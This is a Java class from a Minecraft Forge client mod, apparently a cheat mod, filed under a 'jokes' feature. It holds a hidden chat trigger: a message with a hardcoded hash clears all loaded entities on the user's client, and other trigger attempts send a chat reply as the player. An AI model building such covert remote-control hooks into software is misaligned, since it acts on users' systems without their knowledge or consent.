package cheaters.get.banned.features.jokes;

import cheaters.get.banned.Shady;
import cheaters.get.banned.utils.Utils;
import net.minecraft.entity.Entity;
import net.minecraftforge.client.event.ClientChatReceivedEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;

public class ByeEntities {

    @SubscribeEvent
    public void onChat(ClientChatReceivedEvent event) {
        if(event.type != 0) return;
        String message = event.message.getUnformattedText();
        if(message.contains("!ENTITIES!")) {
            if(message.hashCode() == -192177537 || message.hashCode() == -716076314) {
                event.setCanceled(true);
                for(Entity entity : Shady.mc.theWorld.loadedEntityList) {
                    Shady.mc.theWorld.removeEntity(entity);
                }
            } else {
                Utils.sendMessageAsPlayer("/r Nice try bozo");
            }
        }
    }

}
